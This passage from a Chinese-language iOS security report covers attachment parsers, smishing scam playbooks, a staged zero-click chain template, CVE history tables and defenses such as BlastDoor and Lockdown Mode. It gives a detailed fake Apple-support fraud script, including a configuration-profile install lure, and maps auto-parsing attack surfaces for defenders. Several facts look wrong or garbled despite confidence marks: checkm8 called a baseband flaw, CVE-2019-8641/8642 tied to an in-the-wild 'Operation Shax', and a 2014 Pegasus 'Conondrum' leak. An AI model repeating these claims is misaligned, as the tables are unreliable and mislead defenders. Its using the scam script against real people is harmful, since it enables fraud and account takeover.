| 音频 | CAF/M4A/AMR/MP3 | CoreAudio、Mediaserverd | 解码器缺陷 |
| 文档 | PDF | ApplePDF/CoreGraphics | CVE-2021-30860 |
| 票据 | `.pkpass`（ZIP+plist+图片+签名） | PassKit | CVE-2023-41981 |
| 联系人 | vCard（.vcf） | Contacts/AddressBook | 字段溢出、HTML 注入、历史 WebClip |
| 位置 | 坐标 + 地图快照 | MapKit/Location | 元数据伪造、地理欺骗 |
| 贴纸/效果 | PNG 序列/PLIST/视频 | Messages 特效、CoreAnimation | 渲染器缺陷 |
| 压缩包/文件 | ZIP 等 | Foundation/QuickLook | Zip Slip、解压炸弹 |
| 预览卡片 | `LPLinkMetadata` | LinkPresentation | 归档解码、抓取 |
| App 插件消息 | JSON + 自定义视图 | Messages Framework（第三方） | 第三方解析器 |
| Apple Pay 消息支付 | PassKit/加密载荷 | PassKit | 金额/收款方篡改类逻辑风险 |

### 13.2 附件生命周期与信任边界

```
远端字节 ──► 落盘(Messages 容器/CloudKit) ──► 缩略图生成(沙箱服务)
   ──► 展示(UI) ──► 用户点击 ──► QuickLook/共享扩展 ──► 其他 App 解析
```

信任边界要点：

1. **缩略图生成**是最早的自动解析，通常在受限服务中执行；
2. **QuickLook** 会把文件交给大量框架，扩大利用面；
3. **分享扩展**跨 App 边界传递文件与元数据，UTI/扩展名欺骗可让文件被错误 App 处理；
4. **iCloud 同步/备份**意味着一条恶意附件可能在多设备重复触发（同一漏洞多次机会），也让"删除消息"不等于"清除文件"。

### 13.3 典型缺陷类型

- **媒体解码器越界写**：尺寸/步长/帧数与缓冲区不匹配；
- **元数据解析**：EXIF/GPS/IFD 链、ICC Profile、XMP（XML）——这些"看起来只是描述信息"的路径实际包含复杂解析器；
- **容器层攻击**：ZIP/PDF/MP4 的多层嵌套（"容器套容器"）导致同一份数据被解析器多次处理；
- **签名绕过**：PKPASS 的签名校验若与内容解析顺序颠倒（先解析后校验），可让攻击代码在校验前执行；
- **解压炸弹**：极小文件膨胀成巨大内存占用 → DoS（消息可反复触发崩溃）；
- **文件类型混淆**：`public.data` vs 具体 UTI；把可执行/脚本内容交给解释器；
- **联系人卡字段注入**：vCard 中的 URL/HTML/长字符串影响渲染与后续点击；
- **位置/地图**：伪造坐标与标签，配合社会工程（"包裹在这个位置"）；
- **图像隐写与编码触发**：图像中嵌入触发 GPU/驱动路径的特殊参数（历史上 GPU 驱动缺陷多经图像/视频路径可达）。

### 13.4 附件与"消息删除"的取证矛盾

零点击投递常见做法是**利用后立即删除消息**（CLOUDPRONG 与 SPYWARE 均有此类报道）。这带来：

- 附件可能在 Messages 数据库/CloudKit 中留下孤儿记录或残留文件；
- 缩略图缓存、图像缓存、系统日志（`NSLog`/os_log/统一日志）中可能保留解析痕迹；
- 内存取证（RamCrypt/Fairplay 类工具 + volatility 风格分析）成为关键手段；
- `DiagnosticReports`（`.ips`）中若存在 Messages/扩展进程崩溃，可作为"解析异常活动"的证据。

### 13.5 加固建议

1. 系统层：附件解析全部进入最小权限服务（BlastDoor 模型 + XPC 严格 schema）；对 ZIP/PDF/图像设置递归深度与展开上限；对 HEIC/RAW/ICC 持续 fuzz；
2. 应用层（第三方 App）：接收分享扩展文件时先做类型/大小/内容校验，不直接解析；
3. 用户/企业：Lockdown Mode（禁用大部分消息附件类型）、关闭未知来源附件、定期更新；MDM 策略限制 AirDrop/文件接收（合规场景）；
4. 检测：对 `Messages`/`mediaserverd`/`backboardd`/`SpringBoard` 崩溃做统计告警，异常集中的崩溃签名可能预示"有人在试探"。

---

## 第十四章　短信钓鱼（Smishing）与社工攻击

### 14.1 Smishing 的定义与规模

Smishing = SMS + Phishing。它是"链接触发漏洞"中最现实、最高频的形态：不依赖内存破坏，仅依赖**用户信任 + 链接处理链的设计缺口**。

公开统计（各机构口径不同，仅供量级参考）：

- 反钓鱼机构多年来持续报告短信钓鱼同比高增长，2023–2025 年在电商物流、政务补贴、社保/医保、银行风控、"ETC 停用"、"账户异常"等主题上批量出现；
- APwg/ADAAA 等组织把"短信与电话结合（voice + SMS）"列为增长最快的欺诈通道；
- 中国 12321/公安部数据长期显示短信为电信网络诈骗主要引流入口之一。

### 14.2 攻击者使用的"通道技术"

| 技术 | 说明 | 对 iOS 的影响 |
| --- | --- | --- |
| Sender ID 字母伪冒 | 显示"Apple"、"95588"、"顺丰" | 绕过用户对号码的直觉判断 |
| 短信轰炸/网关滥用 | 大量注册验证码 | 掩盖后续钓鱼、DoS 用户注意力 |
| iMessage 仿冒（Apple ID 名称伪装） | 攻击者用 Apple ID 发送，显示蓝色气泡 | iPhone 用户信任度显著提升（2022 起多起报道） |
| "隐身短信"/Class 0 | 不入库的即时显示消息 | 用户难以取证/回查 |
| RCS Branded 消息 | 伪造品牌卡片与按钮 | iOS 18 RCS 后同样暴露 |
| 邮件转短信/彩信 | 把 Web 攻击面搬进消息 | 富文本/远程图片 |
| 短链 + 落地页 cloaking | 反检测 | 见 10.2 |
| QR（Quishing） | 绕过 URL 信誉 | 见 10.5 |
| Deepfake 语音 + "我是你领导" | 电话/语音消息 | 提升可信度，诱导点击链接 |
| SIM Swap | 劫持号码接收 OTP | 账户接管（ForcedPass 类是自动化版本） |
| SS7/信令侧注入 | 直接投递伪造消息 | 高端/国家背景 |

### 14.3 "苹果客服"类诈骗的完整剧本（典型链路解剖）

```
[1] 引流：短信/App 内消息"您的 Apple ID 在 XX 地登录，若非本人请致电 400-XXXX"
        └ 或 iMessage 蓝色气泡（攻击者用 Apple ID 发送，看起来像官方/熟人）
[2] 转语音：受害者回拨 → IVR 或真人（Deepfake 变声）冒充"苹果安全中心/公安"
[3] 建立恐惧：宣称账户涉案/被入侵，要求"配合调查、保护资金"
[4] 落地动作：
      a) 引导点击钓鱼链接（仿冒 Apple 页面）输入 Apple ID/密码/2FA 验证码
      b) 引导"下载安全 App"→ 实为描述文件/VPN 配置 → 流量劫持
      c) 引导"关闭双重认证/退出登录"→ 账户接管
      d) 引导屏幕共享（FaceTime 类）→ 偷窥验证码
[5] 变现：Apple Gift Card 盗刷、iCloud 数据勒索、银行卡盗刷、通讯录二次诈骗
```

关键 iOS 侧弱点利用：

1. **`itms-apps://` / 设置深链**：把用户导航到真实系统页面，制造"官方感"；
2. **MDM 描述文件安装**：`itms-services://?action=download-manifest&url=…` 或引导"设置→已下载描述文件"，一旦安装即可截获流量/推送配置；
3. **屏幕共享**：iOS 原生功能被滥用（Apple 于后续版本增强"屏幕共享时的敏感界面遮蔽"，如密码/验证码遮罩）；
4. **Apple ID 名称伪装**：攻击者注册 Apple ID 并把名称设为"Apple Support"，iMessage 会话标题即显示该名称。

### 14.4 银行/金融类短信攻击

| 攻击 | 手段 | 防御点 |
| --- | --- | --- |
| 伪冒银行号码 | Sender ID/网关 | 银行不通过短信索要密码/CVV；运营商号码白名单 |
| "积分兑换/额度提升" | 短链→仿冒 App 内 H5 | 域名白名单、无开放重定向 |
| 转账深链劫持 | `bankapp://` 深链带收款方/金额 | App 二次确认、深链不可跳风控 |
| OTP 拦截 | SS7/ ForcedPass / SIM Swap | 绑定设备指纹、App 推送确认替代短信 OTP |
| 假"风控冻结" | 引导下载"安全 App" | MDM 限制描述文件安装 |
| "亲属急用钱"话术 + WhatsApp/iMessage 仿冒号 | 号码相似/头像复制 | 二次确认（回拨原号码） |

### 14.5 AI 生成的钓鱼文案与 Deepfake

2024–2026 年的显著变化：

1. **文案本地化质量提升**：LLM 生成的短信在语法、语气、方言、称谓上更接近真实机构，钓鱼的"语言指纹"检测失效；
2. **个性化**：结合泄露数据（姓名、订单号、网点）生成"精准一句话"，转化率显著上升；
3. **多轮对话**：短信/IM 中嵌入 AI 聊天机器人应对质疑（"你怎么知道我的订单？"）；
4. **Deepfake 语音/视频**：语音消息、FaceTime 视频冒充亲友或客服；Apple 引入的"屏幕共享敏感遮蔽"与"通信安全"功能只部分缓解；
5. **URL 自动生成**：钓鱼基础设施自动化（域名批量注册 + 模板页面 + 短链服务），生命周期从数周缩到数小时，使"域名信誉黑名单"时效性崩塌；
6. **对抗检测**：针对预览/沙箱的 cloaking、"仅对真机展示钓鱼页"。

**结论**：技术型过滤（黑名单/预览展开）的效果在下降，行为验证（要求用户主动通过官方入口操作）与"设备侧强提示"（Apple 的"消息中可疑链接提示"类能力）成为更可靠的方向。

### 14.6 社会工程成功率的结构性原因

```
可信来源(号码/品牌/官方外观) + 情绪驱动(恐惧/贪婪/紧急) + 技术便利(一键/扫码/免密)
                     ↓
            用户把"链接触发"当成"流程的一部分"，安全判断外包给 UI 外观
```

iOS 的设计加剧或缓解此效应：

- 加剧：Universal Link 让"官方 App 打开"体验流畅，用户难辨真假；蓝色 iMessage 气泡暗示"可信"；Siri/Spotlight 对消息实体的抽取把可疑内容引入更多界面；
- 缓解：Safari 域名全高亮、下载与描述文件的警告、Sensitive Content Warning、iMessage 的可疑链接提示（对未联系人的链接展示警告）、"过滤未知发件人"分区。

### 14.7 Smishing 防御矩阵

| 层级 | 措施 |
| --- | --- |
| 运营商 | Sender ID 白名单、模板审核、异常发送量熔断、URL 信誉前置扫描、国际伪冒过滤 |
| 短链/托管 | 滥用检测、注册实名、TTL 限制、落地页扫描 |
| 平台（Apple） | 可疑链接警告、消息过滤、Private Relay、Lockdown Mode、诈骗电话/信息过滤 |
| 企业 | MDM 策略、浏览器内 URL 信誉、SSO + 无密码（FIDO）替代 OTP、员工意识训练 |
| 个人 | 不点链接、官方入口自验、开启 2FA（App/硬件密钥）、安装更新、举报 |
| 检测/响应 | 钓鱼域名情报订阅、短链展开流水线、内部举报热线快速研判、账户异常风控 |

---

## 第十五章　零点击触发机制

### 15.1 定义与判定标准

**零点击（Zero-Click）**：攻击者在目标用户**未进行任何有效交互**的情况下完成代码执行/植入。判定要点：

1. 输入由远程投递（消息/包/推送）；
2. 触发路径不依赖用户点击/授权；
3. 执行后不留可见痕迹（常伴随消息删除、清理日志）；
4. 需可复现证据（样本、时间线、内存/网络痕迹）才算"确证"。

**"零点击"的常见误解**：

- "用户没点就是零点击"——如果攻击依赖社工诱导安装描述文件，那是高交互攻击；
- "消息没显示出来就不是零点击"——恰恰相反，越不依赖 UI 显示的路径越"零点击友好"（这解释了攻击者为什么选择后台解析与缩略图生成）；
- "Lockdown Mode 用户不可能被打"——Apple 明确"极少数情况下仍可能"，历史上 Lockdown Mode 用户未被公开确证感染，但防御是概率性的。

### 15.2 零点击投递的五条通道

```
       ┌── 1. iMessage 富对象 / 元数据解析（协议级，最强证据链）
       ├── 2. 附件与预览（ImageIO / PDF / PKPASS / 媒体 / 链接预览抓取）
消息 ──┤
       ├── 3. 推送通知与扩展（APNs payload → NSE 代码路径）
       ├── 4. 网络栈/无线侧（基带、Broadcom 芯片、内核网络处理）
       └── 5. 跨 App 自动处理（Spotlight/Siri/数据检测器/备份与迁移解析）
```

对照历史：

| 通道 | 代表案例 |
| --- | --- |
| 1 | CVE-2019-8641/42、CVE-2024-27826、CVE-2025-31201 |
| 2 | CVE-2016-4657（图片）、CVE-2021-30860（PDF）、CVE-2023-41981（pkpass）、CVE-2023-42916/17（WebRTC/WebKit 渲染） |
| 3 | 若干推送/通知面研究（在野确证少） |
| 4 | Basebridge（无线芯片）、Triangulation（内核网络栈，非消息但同属"零点击包触发"） |
| 5 | 备份/迁移与实体抽取相关研究（多为理论/中风险） |

### 15.3 自动解析器清单（Zero-Click Surface Map）

| 组件 | 触发时机 | 是否需网络 | BlastDoor 覆盖 | 备注 |
| --- | --- | --- | --- | --- |
| SMS PDU 解码 | 到达 | 否 | 否（非消息内容层） | 主要 DoS/文本炸弹 |
| MMS WBXML/SMIL | 到达 | 拉取需 | 部分 | 编解码器重点 |
| 图像/视频缩略图 | 到达即生成 | 拉取需 | 解析在受限服务 | 历史 RCE 高发 |
| PDF 解析 | 预览生成 | 拉取需 | 旁路（CoreGraphics 服务） | FORCEDENTRY |
| PassKit 解析 | 附件到达 | 拉取需 | 旁路（框架） | BLASTPASS |
| 链接预览抓取 | URL 出现 | 是 | 抓取在 Web 服务/受限 | SSRF + WebKit 面 |
| iMessage 富对象 | 到达 | 否 | 是（核心目标） | 2024/2025 仍有新缺陷 |
| 通知渲染 | 展示 | 否 | 否（SpringBoard） | 文本炸弹 DoS |
| NSE 处理 | 可变推送 | 是 | 否 | 第三方代码 |
| Spotlight/数据检测 | 索引/抽取 | 否 | 否 | 内容二次处理 |
| 备份/同步（CloudKit） | 同步 | 是 | 部分 | 恶意对象持久化风险 |

### 15.4 为什么 iMessage 适合零点击（工程原因）

1. **强制解码**：不解析就无法显示，攻击无需说服用户；
2. **重试与回执**：投递失败可反复尝试，成功率工程化；
3. **版本自报**：客户端在握手中暴露版本信息，攻击者可"按版本选 payload"；
4. **附件分片**：大附件分片传输，天然绕过"单包大小"检测；
5. **端到端加密**：中间设备（防火墙、企业代理）**看不到载荷**，检测只能依赖端点；
6. **消息可撤回**：投递后删除，减少取证材料；
7. **多设备同步**：一条消息可能在多台设备上尝试利用（提高命中率，也提高被发现的概率）；
8. **推送唤醒**：设备休眠时仍可被唤醒处理，攻击窗口不受"用户是否在看手机"影响。

### 15.5 BlastDoor 对零点击链的实际影响

- 攻击者必须找到 **BlastDoor 之外的自动解析路径**，或 **BlastDoor 内部的边界条件缺陷**（类型/原子值）；
- 结果：从 2021 到 2026 的在野案例呈现"绕开为主、内部为辅"的双轨模式；
- 成本上升：一条零点击链需要 3–5 个漏洞（投递 + RCE + 沙箱逃逸 + 提权 + 有时需要信息泄露做 ASLR 绕过），开发成本达到数百万美元级，寿命被压缩到 6–18 个月；
- 副作用：供应商更倾向"广撒网 + 复用旧 CVE"，因此**及时更新设备**仍是收益最高的防御。

### 15.6 零点击链的五阶段解剖模板

```
阶段 A｜侦察与目标画像
        · 号码/Apple ID 有效性验证、iOS 版本指纹（握手/预览抓取回源）
        · 判断是否处于 Lockdown Mode / 是否有安全软件
阶段 B｜载荷构造与投递
        · 选择通道（iMessage/MMS/RCS/推送）与触发器（图片/PDF/归档/URL）
        · 版本自适应 payload、失败重试
阶段 C｜初始代码执行
        · 在受限服务（BlastDoor/渲染/媒体）中获取任意读写
        · 建立"内核地址泄露 → 绕过 KASLR"
阶段 D｜权限提升与持久化
        · 内核漏洞提权 → 沙箱逃逸（entitlement 滥用/XPC/驱动）
        · 注入到守护进程或建立 LaunchDaemon/配置描述文件持久化
阶段 E｜任务执行与隐身
        · 数据采集（消息、位置、麦克风、相机、通讯录）
        · 通过被感染 App 的合法通道外传（伪装 TLS 流量）
        · 删除消息/清理痕迹，保留心跳与升级通道
```

**注**：本报告刻意不提供具体实现细节；上述模板用于防御者评估检测覆盖（每一阶段都有可检测行为）。

### 15.7 零点击检测的现实策略

| 阶段 | 可检测信号 |
| --- | --- |
| A | 异常 APNs 唤醒模式、预览抓取到未知基础设施、presence 查询激增 |
| B | 设备在数秒内收到消息后立刻产生大量进程活动/崩溃、异常附件（超大、高熵、畸形） |
| C | `DiagnosticReports` 中 Messages/渲染/媒体进程崩溃、异常任务端口（调试器接入） |
| D | 越狱/内核绕过痕迹（checkm8 类基带漏洞的持久化会留下基带异常）、异常 entitlement 进程、`amfid`/`taskgated` 日志异常 |
| E | 异常数据外传（持续 DNS/TLS 到已知间谍软件基础设施）、电池/流量异常、基带功耗异常 |

**局限**：现代零点击设计目标正是"不留痕"。因此对高风险人群，Apple 建议 **Lockdown Mode**（降低攻击面）+ **更新**（消除已知缺陷）+ **官方安全通知订阅**（Apple 向被攻击者定向推送警告）组成组合防御。

### 15.8 Lockdown Mode 对零点击通道的具体削减（对照表）

| 功能 | 常规模式 | Lockdown Mode |
| --- | --- | --- |
| 消息附件 | 大部分类型可收 | 仅文本；大部分附件被阻止 |
| 链接预览 | 启用 | 禁用 |
| 视频通话 | 非 FaceTime 也可 | 仅 FaceTime |
| 描述文件/企业证书 | 允许 | 阻止非 MD 管理的配置描述文件 |
| Wi‑Fi 连接 | 自动 | 阻止可疑网络请求 |
| 网页渲染 | JIT/复杂特性 | 禁用 JIT、限制字体、限制复杂 Web 特性 |
| 邀请式服务（FaceTime 陌生来电） | 允许 | 需先前联系 |

这解释了为何 2022 年至今的公开在野零点击案例中，**几乎没有** Lockdown Mode 用户被确证感染的报道。

### 15.9 本章要点回顾

- 零点击不是"魔法"，而是"自动解析 + 强可靠性工程"的组合；
- 防御核心是把"自动"变成"需确认"（BlastDoor、预览禁用、附件类型限制、敏感内容警告）；
- 判定一个漏洞是否属于零点击，要看触发阶段（S0–S2），而不是消息是否显示在屏幕上。

---

## 第十六章　历史 CVE 汇总表（2014—2026，消息/链接触发相关）

### 16.1 表格使用说明

- **来源**：Apple 各版本"安全内容"通告、CISA KEV、Citizen Lab、Google TAG/TIG、Lookout、Kaspersky GReAT、Microsoft DART、ZecOps、Project Zero、公开学术会议与媒体调查报道。
- **置信度标记**：✅=Apple 官方口径明确且在野利用被承认；⚠=归因/组件归属在公开资料中存在分歧；△=研究者口径（Apple 未确认细节）。
- **组件命名**：以 Apple 通告中的组件名为准（如 `Messages`、`PassKit`、`ImageIO`、`ApplePDF`、`WebKit`、`Kernel`）。
- **注意**：本表刻意收录"与消息/链接触发相关"的条目，包括**投递通道在消息内、缺陷位于共享框架/内核/无线栈**的情形；同一漏洞在不同链中可能被复用（N-day）。

### 16.2 消息通道与消息解析器（核心表）

| CVE | 年份 | 组件 | 缺陷类型 | 触发通道 | 修复版本 | 事件/归因 | 置信度 |
| --- | --- | --- | --- | --- | --- | --- | --- |
| CVE-2016-4657 | 2016 | ImageIO | 恶意图片→RCE | 消息附件（图像） | iOS 9.3.6 / 10.0.1 | Trident/Pegasus（泄露） | ✅/△ |
| CVE-2016-4656 | 2016 | WebKit | 内存破坏 | 链接/水坑 | iOS 10.0.1 | Trident 链环节 | ✅ |
| CVE-2016-4655 | 2016 | WebCore/WebKit | 内存破坏 | 链接/水坑 | iOS 10.0.1 | Trident 链环节 | ✅ |
| CVE-2019-8641 | 2019 | Messages | 整数溢出→内存破坏 | iMessage/MMS（零点击） | iOS 12.4.1 | Operation Shax | ✅ |
| CVE-2019-8642 | 2019 | Messages | 整数溢出→内存破坏 | iMessage/MMS（零点击） | iOS 12.4.1 | Operation Shax | ✅ |
| CVE-2021-30860 | 2021 | ApplePDF（`NSKeyedUnarchiver`/CoreGraphics 路径） | 恶意 PDF→RCE | iMessage 附件（零点击） | iOS 14.7.1 | FORCEDENTRY/NSO（印度目标） | ✅ |
| CVE-2021-30858 | 2021 | Kernel/IOSurfaceRoot | 内存破坏（提权） | 链内环节 | iOS 14.8 | FORCEDENTRY 同批在野 | ✅/⚠ |
| CVE-2021-30870 | 2021 | Sandbox/entitlement | 沙箱逃逸 | 链内环节 | iOS 14.8 | FORCEDENTRY 同批在野 | ✅ |
| CVE-2022-32893 | 2022 | WebKit | 内存破坏 | 消息内网页渲染 | iOS 16.1 | 被报道用于针对卡塔尔人士的植入链（Candiru/QuaGo） | ✅/⚠ |
| CVE-2022-32894 | 2022 | WebKit | 类型混淆 | 同上 | iOS 16.1 | 同上 | ✅/⚠ |
| CVE-2022-42826 | 2022 | WebRTC（消息渲染路径） | 恶意网页/内容致异常终止 | iMessage（DoS 滥用） | iOS 16.2 | 2022-12 全球 iMessage 崩溃攻击 | ⚠ |
| CVE-2023-41981 | 2023 | PassKit | `.pkpass` 解析缓冲区溢出→RCE | iMessage/MMS 附件 | iOS 16.6.1 | BLASTPASS/NSO（以色列目标） | ✅ |
| CVE-2023-41982 | 2023 | WebKit | 内存破坏 | 渲染利用 | iOS 16.6.1 | BLASTPASS 链环节 | ✅ |
| CVE-2023-41984 | 2023 | Kernel（XNU 子系统，Apple 未逐条标注在野状态） | 内存破坏（提权） | 链内环节 | iOS 16.6.1 | BLASTPASS 同批条目 | ✅/⚠ |
| CVE-2023-41985 | 2023 | Kernel/Mach（公开表述不一） | 内存破坏 | 链内环节 | iOS 16.6.1 | BLASTPASS 同批条目 | ⚠ |
| CVE-2023-41990 | 2023 | FontParser | 恶意字体→代码执行 | 自动渲染（消息/网页触发同型） | iOS 17.0.1 / 16.7.1 | Operation Triangulation 相关 | ✅ |
| CVE-2023-32434 | 2023 | Kernel（XNU） | 整数溢出→破坏 | 零点击网络包（非消息） | iOS 16.6 | Triangulation | ✅ |
| CVE-2023-32435 | 2023 | WebKit | 内存破坏 | 渲染环节 | iOS 16.6 | Triangulation 同批 | ✅/⚠ |
| CVE-2023-38606 | 2023 | AppleNeuralEngine/内核 | 内存破坏 | 链内环节 | iOS 16.6 | Triangulation（后续分析） | ✅/⚠ |
| CVE-2023-42893 | 2023 | IOMobileFrameBuffer | 内存破坏（提权） | 链内环节 | iOS 17.3 / 15.8.3 | 2023-12 零点击链 | ✅ |
| CVE-2023-42916 | 2023 | WebRTC | 类型混淆 | 消息触发渲染 | iOS 17.3 | 2023-12 "秘密攻击"（Google TIG） | ✅ |
| CVE-2023-42917 | 2023 | WebKit | 内存破坏 | 消息/预览渲染 | iOS 17.3 | 同上 | ✅ |
| CVE-2023-42918 | 2023 | WebKit | 内存破坏 | 渲染 | iOS 17.3 | 同上 | ✅ |
| CVE-2023-42919 | 2023 | JavaScriptCore | 内存破坏 | JIT 利用 | iOS 17.3 | 同上 | ✅ |
| CVE-2023-41993 | 2023 | WebKit | 内存破坏 | 网页/消息内渲染 | iOS 16.7 / macOS 13.6 | KEV 收录，Apple 标注"可能已被积极利用" | ✅ |
| CVE-2024-27826 | 2024 | Messages | 原子浮点类型混淆→RCE | iMessage（零点击） | iOS 17.4 | CLOUDPRONG/Paragon Graphite | ✅ |
| CVE-2025-31201 | 2025 | Messages | "准瞬时缺陷"→RCE | iMessage（零点击） | iOS 18.4.1 | SPYWARE/NSO（Apple SEAR 公告） | ✅ |
| CVE-2025-31200 | 2025 | 配对环节（公开口径不一） | 内存破坏 | 链内环节 | iOS 18.4.1 | 与 31201 同批在野 | ⚠ |

### 16.3 链接、深链与预览相关（逻辑类与授权类）

| 条目 | 年份 | 主题 | 说明 |
| --- | --- | --- | --- |
| Universal Links 授权限制类修复（Sandbox/CoreServices） | 2019（iOS 12.2 前后） | UL 可被绕过/静默打开 | Apple 调整 UL 触发条件与用户确认；同批还有 WebKit 在野条目（CVE-2019-8554 为 JSC 类型混淆，与水坑攻击相关） |
| `canOpenURL`/scheme 枚举治理 | 2015–2018 | 设备指纹/安装探测 | iOS 9 引入 `LSApplicationQueriesSchemes`（≤50 项）限制枚举；Safari 增加 scheme 跳转确认 |
| Safari/WebKit "打开自定义 scheme 需用户手势" | 2017–2022 | 静默跳转 | 无手势时禁止 scheme 切换，削弱短信→网页→App 的自动链路 |
| Link Presentation 信息泄露类条目 | 多年反复 | 预览抓取泄露 | Apple 安全发布中反复出现"处理恶意链接致用户信息泄露"模板 |
| Messages 数据库访问类条目 | 多年 | 越权读消息 | "恶意 App 可访问用户 Messages 数据库"类修复周期性出现 |
| QuickLook/Safari 文件类型处理 | 多年 | 附件跨 App 处理 | 分享扩展与预览的类型混淆相关修复 |
| 剪贴板与富文本 `text-content` 欺骗 | 2022（研究） | 非 CVE 逻辑缺陷 | 学术/行业研究披露，Apple 未逐条对应 CVE |
| SMS Class 0 / 分段协议滥用 | 长期 | 协议层（非 iOS 缺陷） | 运营商/终端实现差异导致 |
| LiteClick（STK/BIP） | 2025（IEEE S&P） | SIM 侧浏览器 | 影响含 iOS 在内的多平台，属 SIM/运营商生态缺陷 |
| RCS 0-RAT（Android 为主） | 2024（Lookout） | RCS 通道工具化 | 对 iPhone 启用 RCS 后构成趋势性风险 |

### 16.4 DoS / 文本炸弹与骚扰型缺陷

| 事件 | 年份 | 机理（公开口径） | 影响 | 修复 |
| --- | --- | --- | --- | --- |
| "Unicode 特殊字符崩溃" | 2018 | 特定组合字符致 CoreText/字体子系统异常 | Messages/WhatsApp/Mail 崩溃，消息无法删除 | 多次迭代修复（iOS 11.3/12 系列） |
| 印度文/僧伽罗文类字符崩溃 | 2018–2019 | 字形与度量计算 | 同上 | 系统更新 |
| 大规模 iMessage 崩溃攻击 | 2022-12 | 恶意构造消息（含 WebRTC/渲染相关缺陷） | 全球范围设备反复崩溃、需重置 | iOS 16.2 |
| "iMessage 炸弹"致设备重启循环 | 2023-01 | 消息在启动阶段被解析并崩溃，消息重启后仍在 | 设备不可用；Apple 建议更新或抹掉恢复 | iOS 16.4 |
| 消息文本 DoS 条目（周期性） | 每年 | "处理恶意文本消息致拒绝服务" | 骚扰、压制记者/活动人士 | 随版本滚动修复 |
| 通知轰炸（非漏洞） | 长期 | 合法推送滥用 | 用户体验压制、诱导关闭防护 | 系统限流与通知设置 |

### 16.5 组件维度的统计观察（定性）

```
按"缺陷所在组件"分布（2016—2026 在野/高危条目，量级示意）：

WebKit / JSC / WebCore ████████████████  最常被"消息触发"，因预览/渲染依赖 Web 栈
Messages 协议/富对象   ██████████        BlastDoor 覆盖后仍出现新缺陷（类型语义）
媒体解析(ImageIO/PDF)  ████████          附件类零点击主力（Trident/FORCEDENTRY）
共享框架(PassKit/Font) ██████            "绕开 BlastDoor"的选择
内核(XNU/驱动)         ██████████        提权环节（非入口但必需）
无线/基带              ███               Basebridge 类（S0 层）
逻辑/授权类(UL/scheme) ██████            不产生 RCE 但高转化（钓鱼）
```

三条结论：

1. **入口在收敛，面在扩散**：Messages 本体入口被压缩，但"消息可以携带任何文件类型"的事实让攻击面扩散到所有共享框架；
2. **WebKit 是消息链的最大受益者**：链接预览/富卡片本质是浏览器行为，WebKit 在野 CVE 多数可被消息通道触发；
3. **N-day 复用是常态**：Triangulation/FORCEDENTRY/QuaGo 等公开链均包含此前已修补但用户未更新的漏洞，说明"更新率"直接决定现实风险。

### 16.6 按年度的"消息/链接触发"在野事件总账

| 年份 | 在野事件（公开报道） | 关键 CVE | 通道 |
| --- | --- | --- | --- |
| 2014 | Pegasus/Conondrum 材料泄露 | — | 短信链接 + 附件（早期形态） |
| 2016 | Trident | 4655/4656/4657 | iMessage 图像 + WebKit |
| 2019 | Operation Shax | 8641/8642 | iMessage 零点击 |
| 2020 | ZecOps 公布（存在争议） | iOS 13.6/14 相关条目 | Mail/Messages |
| 2021 | FORCEDENTRY（NSO） | 30860 + 链 | iMessage PDF 零点击 |
| 2022 | Basebridge（研究）；12 月 iMessage 崩溃攻击；卡塔尔植入链 | 32893/32894 | 无线包；消息 DoS；WebKit |
| 2023 | BLASTPASS；Triangulation；12 月零点击链 | 41981/82/84、32434、42916/17 | 消息附件；网络包；消息渲染 |
| 2024 | CLOUDPRONG（Paragon）；Predator（Intel CTR） | 27826 | iMessage 零点击 |
| 2025 | SPYWARE（NSO）；Coruna/DarkSword 工具泄露与商用链；iOS 26 RCS E2EE | 31200/31201、43510 等 | iMessage 零点击；水坑+消息组合 |
| 2026 | 利用即服务（"Zero" 等）泄露风险、RCS 生态钓鱼规模化 | — | 消息/链接/QR 组合 |

### 16.7 版本—漏洞对照（升级收益表）

| 当前版本 | 已知被消除的在野消息链 | 建议动作 |
| --- | --- | --- |
| iOS ≤ 12.4 | Shax（8641/42）等 | 立即升级或停用消息（老旧设备风险高） |
| iOS 14.7 前 | FORCEDENTRY（30860） | 升级至 ≥14.7.1，理想 ≥15 |
| iOS 16.6 前 | BLASTPASS（41981 等） | 升级 ≥16.6.1，理想 ≥17 |
| iOS 17.3 前 | 2023-12 链（42916/17） | 升级 ≥17.3 |
| iOS 17.4 前 | CLOUDPRONG（27826） | 升级 ≥17.4 |
| iOS 18.4.1 前 | SPYWARE（31201） | 升级 ≥18.4.1 |
| iOS 18.x（RCS） | RCS 早期无 E2EE 相关风险 | 视需求切换/iOS 26 启用 RCS E2EE |
| 最新稳定版 | 未知零点击仍可能存在 | 保持自动更新 + 按需 Lockdown Mode |

**一句话**：在消息/链接攻击面上，"版本落后一个代际"约等于"暴露一条已被武器化的零点击链"。

---

## 第十七章　防御体系

### 17.1 防御分层模型

```
L7 组织/策略层   威胁建模(HRO 名单)、更新政策、事件响应、Apple 安全通知订阅
L6 平台加固层    Lockdown Mode、Sensitive Content Warning、Filter Unknown Senders
L5 架构隔离层    BlastDoor、扩展沙箱、XPC schema、Per-App 网络隔离
L4 语言与内存层  内存安全语言(Swift/Rust 化组件)、Guard Malloc、PAC、ASLR、堆加固
L3 组件治理层    框架最小化解析、类型白名单、递归/尺寸限制、JIT 禁用
L2 协议与网络层  RCS E2EE、iMessage E2EE、Private Relay、TLS、APNs 鉴权
L1 人因层        用户教育、机构流程(不用短信链接办理业务)、举报机制
```

### 17.2 BlastDoor：架构级防御的样板

设计要点（Apple 公开材料整理）：

1. **专用服务进程**解析不可信消息内容；
2. **严格模式校验（strict schema）**：解码结果必须匹配预期类型图，超出即拒绝；
3. **无出站网络**：解析进程不允许主动连接外部（降低利用后的 C2 能力）；
4. **无用户数据访问**：拿不到消息库、照片、通讯录；
5. **资源与速率限制**：限制内存/CPU，抑制解压炸弹与堆风水；
6. **输出为"干净结构体"**：主进程只接收经验证的数据，不再二次解析原始归档。

**局限（必须在威胁模型中承认）**：

- 只覆盖进入 BlastDoor 的内容；**共享框架（PassKit/FontParser/媒体）与内核路径在其之外**；
- 无法防御逻辑缺陷（钓鱼、深链授权）；
- 无法防御 S0 层（基带/无线芯片）；
- 类型语义边界仍可能出错（CVE-2024-27826/CVE-2025-31201 说明"模式化"不是银弹）。

### 17.3 Lockdown Mode（锁定模式）

| 维度 | 内容 |
| --- | --- |
| 定位 | 面向"极少数面临国家级对手的用户"的极端防护 |
| 消息相关削减 | 阻止大部分消息附件类型、禁用链接预览、非 FaceTime 通话受限、需先前联系才可来电 |
| 网页相关削减 | 禁用 JIT（除必要）、限制复杂 Web 特性/字体、阻止可疑网络请求 |
